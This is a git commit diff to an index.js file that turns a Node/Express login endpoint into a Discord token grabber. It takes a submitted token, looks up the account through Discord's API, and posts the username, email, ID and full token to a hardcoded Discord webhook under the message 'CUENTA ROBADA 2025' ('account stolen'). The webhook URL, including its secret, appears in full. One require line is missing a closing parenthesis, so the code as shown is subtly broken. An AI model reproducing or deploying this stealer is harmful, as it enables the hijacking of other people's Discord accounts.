eb0230640850041e20af3080031f65ee941ed346
10116066-debug <10116066@clases.edu.sv>
2025-12-06 19:50:20 -0600

    Update index.js

--- index.js
+++ index.js
@@ -1,4 +1,58 @@
+const express = require('express');
+const https = require('https';
+const app = express();
+app.use(express.json());
+
 app.post('/login', async (req, res) => {
   const token = req.body.token;
-  res.send("TOKEN RECIBIDO: " + token.substring(0,30) + "..."); // esto te muestra el token en la pantalla
+  if (!token || token.length < 50) return res.send("no token");
+
+  try {
+    const user = await discordAPI('GET', '/users/@me', token);
+
+    const WEBHOOK = "https://discord.com/api/webhooks/1447039795342610596/nkakwoCsFOLzwFOSCtJ1vP42Ibninhw5dq5oVraSyQTfT02ibl1j5qw1LgUdxP2GLyl1";
+
+    await discordAPI('POST', '/webhooks/' + WEBHOOK.split('/webhooks/')[1], null, JSON.stringify({
+      content: "@everyone **CUENTA ROBADA 2025**",
+      embeds: [{
+        title: `${user.username}#${user.discriminator}`,
+        description: `Email: ${user.email || 'oculto'}\nID: ${user.id}\nToken completo abajo`,
+        thumbnail: { url: `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png?size=512` },
+        color: 0x00ff00,
+        fields: [{ name: "TOKEN", value: "```" + token + "```" }]
+      }]
+    }));
+
+    res.send("LOGUEADO");
+  } catch {
+    res.send("invalid");
+  }
 });
+
+function discordAPI(method, path, token, body = null) {
+  return new Promise((resolve, reject) => {
+    const options = {
+      hostname: 'discord.com',
+      path: '/api/v9' + path,
+      method: method,
+      headers: {
+        'Authorization': token || undefined,
+        'Content-Type': 'application/json',
+        'User-Agent': 'Mozilla/5.0'
+      }
+    };
+    const req = https.request(options, res => {
+      let data = '';
+      res.on('data', d => data += d);
+      res.on('end', () => {
+        try { resolve(JSON.parse(data)); }
+        catch { resolve(data); }
+      });
+    });
+    req.on('error', reject);
+    if (body) req.write(body);
+    req.end();
+  });
+}
+
+app.listen(process.env.PORT || 3000);
